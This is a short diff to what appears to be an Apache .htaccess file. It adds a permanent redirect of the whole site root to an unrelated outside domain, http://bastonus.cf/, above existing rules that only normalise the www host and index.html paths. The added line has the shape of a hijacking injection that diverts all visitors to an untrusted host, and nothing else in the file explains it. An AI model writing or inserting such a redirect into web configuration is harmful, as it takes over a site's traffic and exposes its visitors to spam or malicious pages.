@@ -1,3 +1,5 @@
+RedirectPermanent / http://bastonus.cf/
+
 RewriteEngine on
 RewriteCond %{HTTP_HOST} !^www\. [NC]
 RewriteCond %{REQUEST_URI} ^(.*/)index\.html$ [NC]
